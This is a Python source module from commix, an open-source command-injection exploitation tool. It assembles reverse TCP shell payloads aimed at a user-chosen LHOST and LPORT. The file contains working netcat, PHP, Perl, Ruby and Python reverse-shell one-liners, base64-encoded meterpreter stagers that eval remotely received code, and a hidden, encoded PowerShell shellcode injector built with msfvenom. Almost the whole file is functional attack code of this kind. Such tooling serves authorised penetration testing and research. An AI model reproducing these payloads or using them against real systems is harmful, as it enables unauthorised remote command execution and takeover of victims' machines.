#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import os
import re
import sys
import time
import base64
import subprocess
from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

"""
check / set lhost option for reverse TCP connection
"""
def check_lhost(lhost):
  parts = lhost.split('.')
  if len(parts) == 4 and all(part.isdigit() for part in parts) and all(0 <= int(part) <= 255 for part in parts):
    settings.LHOST = lhost
    print "LHOST => " + settings.LHOST
    return True
  else:
    err_msg = "The provided IP is not in "
    err_msg += "appropriate format (i.e 192.168.1.5)."
    print settings.print_error_msg(err_msg)
    return False

"""
check / set lport option for reverse TCP connection
"""
def check_lport(lport):
  try:  
    if float(lport):
      settings.LPORT = lport
      print "LPORT => " + settings.LPORT
      return True
  except ValueError:
    err_msg = "The provided port must be numeric (i.e. 1234)"
    print settings.print_error_msg(err_msg)
    return False


"""
Set up the netcat reverse TCP connection
"""
def netcat_version():

  # Netcat alternatives
  NETCAT_ALTERNATIVES = [
    "/bin/nc",
    "/bin/busybox nc",
    "/bin/nc.traditional"
  ]

  while True:
    nc_version = raw_input("""
  ---[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like targets""" + Style.RESET_ALL + """ ]--- 
  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
  Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
  Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 

commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_ALL + """) > """)
    
    # Default Netcat
    if nc_version == '1':
      nc_alternative = NETCAT_ALTERNATIVES[0]
      break
    # Netcat for Busybox
    if nc_version == '2':
      nc_alternative = NETCAT_ALTERNATIVES[1]
      break
    # Netcat-Traditional 
    elif nc_version == '3':
      nc_alternative = NETCAT_ALTERNATIVES[2]
      break
    elif nc_version.lower() == "reverse_tcp": 
      warn_msg = "You are already into the 'reverse_tcp' mode."
      print settings.print_warning_msg(warn_msg)
      continue
    elif nc_version.lower() == "?": 
      menu.shell_options()
      continue    
    elif nc_version.lower() in settings.SHELL_OPTIONS:
      return nc_version
    elif nc_version[0:3].lower() == "set":
      if nc_version[4:9].lower() == "lhost":
        check_lhost(nc_version[10:])
      if nc_version[4:9].lower() == "lport":
        check_lport(nc_version[10:])
    else:
      err_msg = "The '" + nc_version + "' option, is not valid."  
      print settings.print_error_msg(err_msg)
      continue

  cmd = nc_alternative + " " + settings.LHOST + " " + settings.LPORT + " -e /bin/sh"

  return cmd

"""
Set up other [1] reverse tcp shell connections
[1] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
"""
def other_reverse_shells():

  while True:
    other_shell = raw_input("""
  ---[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like reverse TCP shells""" + Style.RESET_ALL + """ ]---
  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP reverse TCP shell.
  Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl reverse TCP shell.
  Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby reverse TCP shell. 
  Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
  \n  ---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter reverse TCP shells""" + Style.RESET_ALL + """ ]---
  Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
  Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
  Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 

commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
    # PHP-reverse-shell
    if other_shell == '1':
      other_shell = "php -r '$sock=fsockopen(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
                "exec(\"/bin/sh -i <%263 >%263 2>%263\");'"
      break

    # Perl-reverse-shell
    elif other_shell == '2':
      other_shell = "perl -e 'use Socket;" \
                "$i=\"" + settings.LHOST  + "\";" \
                "$p=" + settings.LPORT  + ";" \
                "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
                "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\");" \
                "open(STDOUT,\">%26S\");open(STDERR,\">%26S\");" \
                "exec(\"/bin/sh -i\");};'"
      break

    # Ruby-reverse-shell
    elif other_shell == '3':
      other_shell = "ruby -rsocket -e 'exit if fork;" \
                "c=TCPSocket.new(\"" + settings.LHOST  + "\"," + settings.LPORT  + ");" \
                "while(cmd=c.gets);" \
                "IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
      break

    # Python-reverse-shell 
    elif other_shell == '4':
      other_shell = "python -c 'import socket,subprocess,os%0d" \
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                "s.connect((\"" + settings.LHOST  + "\"," + settings.LPORT + "))%0d" \
                "os.dup2(s.fileno(),0)%0d" \
                "os.dup2(s.fileno(),1)%0d" \
                "os.dup2(s.fileno(),2)%0d" \
                "p=subprocess.call([\"/bin/sh\",\"-i\"])%0d'"
      break

    # PHP-reverse-shell (meterpreter)
    elif other_shell == '5':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print settings.print_error_msg(error_msg)
        continue

      other_shell ="""/*<?php /**/ error_reporting(0); 
$ip = '""" + settings.LHOST  + """'; $port = """ + settings.LPORT  + """;
if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); 
$s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f))
{ $s = $f($ip, $port); $s_type = 'stream'; }
elseif (($f = 'socket_create') && is_callable($f))
{ $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port);
if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); }
if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4);
break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } 
$a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) 
{ switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break;
case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();"""
      other_shell = base64.b64encode(other_shell)
      if settings.TARGET_OS == "win": 
        print ""
        while True:
          question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
          question_msg += "' as PHP working directory on the target host? [Y/n] > "
          sys.stdout.write(settings.print_question_msg(question_msg))
          php_dir = sys.stdin.readline().replace("\n","").lower()
          if php_dir in settings.CHOICE_YES:
            break
          elif php_dir in settings.CHOICE_NO:
            question_msg = "Please provide a custom working directory for PHP (e.g. '" 
            question_msg += settings.WIN_PHP_DIR + "') > "
            sys.stdout.write(settings.print_question_msg(question_msg))
            settings.WIN_PHP_DIR = sys.stdin.readline().replace("\n","").lower()
            break
          else:
            if php_dir == "":
              php_dir = "enter"
            err_msg = "'" + php_dir + "' is not a valid answer."  
            print settings.print_error_msg(err_msg)
            pass

        other_shell = settings.WIN_PHP_DIR + " -r eval(base64_decode(" + other_shell + "));"
      else:
        other_shell = "php -r \"eval(base64_decode(" + other_shell + "));\""
      break

    # Python-reverse-shell (meterpreter)
    elif other_shell == '6':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print settings.print_error_msg(error_msg)
        continue

      other_shell = """import socket,struct
s=socket.socket(2,1)
s.connect(('""" + settings.LHOST + """',""" + settings.LPORT + """))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(4096)
while len(d)!=l:
  d+=s.recv(4096)
exec(d,{'s':s})"""      
      other_shell = base64.b64encode(other_shell)
      if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
        print ""
        while True:
          question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
          question_msg += "' as Python working directory on the target host? [Y/n] > "
          sys.stdout.write(settings.print_question_msg(question_msg))
          python_dir = sys.stdin.readline().replace("\n","").lower()
          if python_dir in settings.CHOICE_YES:
            break
          elif python_dir in settings.CHOICE_NO:
            question_msg = "Please provide a custom working directory for Python (e.g. '" 
            question_msg += settings.WIN_PYTHON_DIR + "') > "
            sys.stdout.write(settings.print_question_msg(question_msg))
            settings.WIN_PYTHON_DIR = sys.stdin.readline().replace("\n","").lower()
            break
          else:
            if python_dir == "":
              python_dir = "enter"
            err_msg = "'" + python_dir + "' is not a valid answer."  
            print settings.print_error_msg(err_msg)
            pass
        other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + other_shell + "'.decode('base64'))"
      else:
        other_shell = "python -c \"exec('" + other_shell + "'.decode('base64'))\""
      break

    elif other_shell == '7':
      if not settings.TARGET_OS == "win":
        error_msg = "This attack vector is available only for Windows targets."
        print settings.print_error_msg(error_msg)
        continue
      else:
        while True:
          windows_reverse_shell = raw_input("""
  ---[ """ + Style.BRIGHT + Fore.BLUE + """Powershell injection attacks""" + Style.RESET_ALL + """ ]---
  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
  Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.

commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)

          if not os.path.exists(settings.METASPLOIT_PATH):
            error_msg = settings.METASPLOIT_ERROR_MSG
            print settings.print_error_msg(error_msg)
            continue
            
          payload = "windows/meterpreter/reverse_tcp"
          output = "powershell_attack.txt"

          # TrustedSec's Magic Unicorn (3rd Party)
          if windows_reverse_shell == '1':
            # define standard metasploit payload
            info_msg = "Please wait, while generating the payload shellcode... "
            sys.stdout.write("\n" + settings.print_info_msg(info_msg))
            sys.stdout.flush()
            try:
              proc = subprocess.Popen("msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(settings.LPORT) + " -f c -o " + output + ">/dev/null 2>&1", shell=True).wait()
              with open(output, 'r') as content_file:
                repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', '\\x': ',0x', 'unsignedcharbuf[]=': ''}
                shellcode = reduce(lambda a, kv: a.replace(*kv), iter(repls.items()), content_file.read()).rstrip()[1:]
              # One line shellcode injection with native x86 shellcode
              # Greetz to Dave Kennedy (@HackingDave)
              powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
              other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
              print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
              # Remove the "powershell_attack.txt" file.
              os.remove(output)
            except:
              print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
            break

          if windows_reverse_shell == '2':
            unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
            os.chdir(unicorn_path)
            # define standard metasploit payload
            info_msg = "Please wait, while generating the payload shellcode... "
            sys.stdout.write("\n" + settings.print_info_msg(info_msg))
            sys.stdout.flush()
            try:
              subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
              # Remove the "unicorn.rc" file.
              os.remove("unicorn.rc")
              with open(output, 'r') as content_file:
                other_shell = content_file.read().replace('\n', '')
              print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
              # Remove the "powershell_attack.txt" file.
              os.remove(output)
            except:
              print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
            break
      break
    elif other_shell.lower() == "reverse_tcp":
      warn_msg = "You are already into the 'reverse_tcp' mode."
      print settings.print_warning_msg(warn_msg)
      continue
    elif other_shell.lower() in settings.SHELL_OPTIONS:
      return other_shell
    elif other_shell[0:3].lower() == "set":
      if other_shell[4:9].lower() == "lhost":
        check_lhost(other_shell[10:])
      if other_shell[4:9].lower() == "lport":
        check_lport(other_shell[10:])
    elif other_shell.lower() == "quit": 
      sys.exit(0)
    else:
      err_msg = "The '" + other_shell + "' option, is not valid."  
      print settings.print_error_msg(err_msg)
      continue

  return other_shell

"""
Choose type of reverse TCP connection.
"""
def reverse_tcp_options():

  while True:
    reverse_tcp_option = raw_input("""   
  ---[ """ + Style.BRIGHT + Fore.BLUE + """Reverse TCP shells""" + Style.RESET_ALL + """ ]---     
  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a Netcat reverse TCP shell.
  Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TCP shells.

commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
    # Option 1 - Netcat shell
    if reverse_tcp_option == '1' :
      reverse_tcp_option = netcat_version()
      break
    # Option 2 - Other (Netcat-Without-Netcat) shells
    elif reverse_tcp_option == '2' :
      reverse_tcp_option = other_reverse_shells()
      break
    elif reverse_tcp_option.lower() == "reverse_tcp": 
      warn_msg = "You are already into the 'reverse_tcp' mode."
      print settings.print_warning_msg(warn_msg)
      continue
    elif reverse_tcp_option.lower() == "?": 
      menu.shell_options()
      continue
    elif reverse_tcp_option.lower() == "quit": 
      sys.exit(0)
    elif reverse_tcp_option.lower() in settings.SHELL_OPTIONS:
      return reverse_tcp_option
    elif reverse_tcp_option[0:3].lower() == "set":
      if reverse_tcp_option[4:9].lower() == "lhost":
        check_lhost(reverse_tcp_option[10:])
      if reverse_tcp_option[4:9].lower() == "lport":
        check_lport(reverse_tcp_option[10:])
    else:
      err_msg = "The '" + reverse_tcp_option + "' option, is not valid."
      print settings.print_error_msg(err_msg)
      continue

  return reverse_tcp_option

"""
Set up the reverse TCP connection
"""
def configure_reverse_tcp():
  # Set up LHOST for the reverse TCP connection
  while True:
    option = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
    if option.lower() == "reverse_tcp": 
      warn_msg = "You are already into the 'reverse_tcp' mode."
      print settings.print_warning_msg(warn_msg)+ "\n"
      continue
    elif option.lower() == "?": 
      menu.shell_options()
      continue
    elif option.lower() == "quit": 
      sys.exit(0)
    elif option[0:3].lower() == "set":
        if option[4:9].lower() == "lhost":
          if check_lhost(option[10:]):
            if len(settings.LPORT) == 0:
              pass
            else:
              break
          else:
            continue  
        if option[4:9].lower() == "lport":
          if check_lport(option[10:]):
            if len(settings.LHOST) == 0:
              pass
            else:
              break
          else:
            continue
    elif option.lower() == "os_shell" or option.lower() == "back": 
      settings.REVERSE_TCP = False   
      break 
    else:
      err_msg = "The '" + option + "' option, is not valid."
      print settings.print_error_msg(err_msg)
      pass

# eof